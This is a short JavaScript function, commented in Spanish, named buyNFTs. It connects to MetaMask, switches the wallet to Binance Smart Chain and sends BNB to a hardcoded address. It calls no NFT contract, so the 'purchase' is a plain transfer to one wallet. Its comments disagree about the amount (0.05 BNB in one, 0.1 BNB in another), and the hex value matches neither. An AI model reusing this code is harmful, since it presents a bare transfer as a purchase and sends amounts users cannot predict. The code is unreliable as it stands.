async function buyNFTs() {
    // Verificar si MetaMask está instalado
    if (typeof window.ethereum === 'undefined') {
        console.log('Please install MetaMask to use this feature');
        return;
    }

    try {
        // Solicitar acceso a MetaMask
        await window.ethereum.request({ method: 'eth_requestAccounts' });

        // Cambiar a la red Binance Smart Chain (BNB)
        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x38' }]  // 56 in decimal for Binance Smart Chain
        });

        // Enviar la transacción de 0.05 BNB a la dirección especificada
        const transactionParameters = {
            to: '0xBF92611C71f906FDD5ae1F61d93Ab65ED18784f5',  // Dirección de destino
            from: window.ethereum.selectedAddress,
            value: '0x1312d00f4e10000',  // 0.1 BNB en hexadecimal
            gas: '0xc350',  // 50000 en hexadecimal
        };        

        // Solicitar la firma de la transacción
        const txHash = await window.ethereum.request({
            method: 'eth_sendTransaction',
            params: [transactionParameters],
        });

        console.log(`Transaction sent successfully! Transaction hash: ${txHash}`);
    } catch (error) {
        console.error('Error sending transaction:', error);
        console.log('Error sending transaction. Check the console for more details.');
    }
}
